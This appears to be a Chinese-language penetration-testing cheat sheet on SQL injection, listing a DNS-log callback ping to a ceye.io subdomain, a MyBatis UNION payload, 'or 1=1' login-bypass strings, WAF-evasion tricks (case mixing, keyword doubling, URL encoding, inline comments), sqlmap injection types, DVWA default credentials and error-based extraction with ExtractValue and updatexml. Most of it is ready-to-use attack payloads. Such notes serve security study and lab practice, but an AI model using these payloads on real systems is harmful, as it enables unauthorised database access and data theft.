## CEYE DNS
   ping n.6vlqdr.ceye.io

## mybatis concat #{name} 注入 payload
*  ' UNION SELECT "1","2","3","4","5" -- '

## 注入万能尝试语法
    ' or 1=1 --+
    " or 1=1 --+
    )' or 1=1 --+
    )" or 1=1 --+
## 绕过waf
    大小写混合 uNIoN sELecT 1,2,3,4
    2.替换关键字 selselectect 1,2,3,4
    使用编码 %55nion %53elect 1,2,3,4
    使用注释 union/**/select 1,2,3,4
    等价函数与命令 @@datadir ==> datadir()
    特殊符号 select+id+from users;
## sql 注入类型 工具 sqlmap
    boolean-based blind 基于Boolean的盲注
    time-based blind 基于时间的盲注error-based 基于报错
    UNION query-based 基于联合查询
    stacked queries 基于多条SQL语句（堆叠注入）
    out-of-band（OOB） 非应用内通信注入，比如DNSLog
    
## mysql 基本操作
    INSERT INTO test (name,phone,yx) VALUES ("z","1","x") 增加
    SELECT * FROM test WHERE name="z" 查询
    UPDATE test SET name="zz" WHERE name="z" 改
    DELETE FROM test where name="zz" 删除
    user dvwa
    password password
    SHOW DATABASES; 查看数据库
    shwo tables; 查看表
    show global variables 查看变量
    SHOW COLUMNS FROM sys_user 查询列
    SELECT DATABASE(); 查询数据库名称
    SELECT USER();
    SELECT version();
    SELECT area_id FROM t_area ORDER BY area_id ASC  排序
    UNION  SELECT * FROM sys_user WHERE user_id="1" UNION SELECT * FROM sys_user WHERE account="liugp" 两条语句用于连接
    SELECT GROUP_CONCAT(account) FROM sys_user  字符拼接成一行
    SELECT if(1=1,1,2)  三元判断
    select sleep(1) 延迟执行
    SELECT ExtractValue('<a><b>ssss</b></a>','/a/b') AS val -- ssss; 就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。 注入 SELECT ExtractValue('<a><b>ssss</b></a>',concat(0x7e,(SELECT database()),0x7e))
    SELECT updateXML('<f>111</f>','/f','<e>fff</e>') AS val1 替换 注入sql SELECT updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
 
 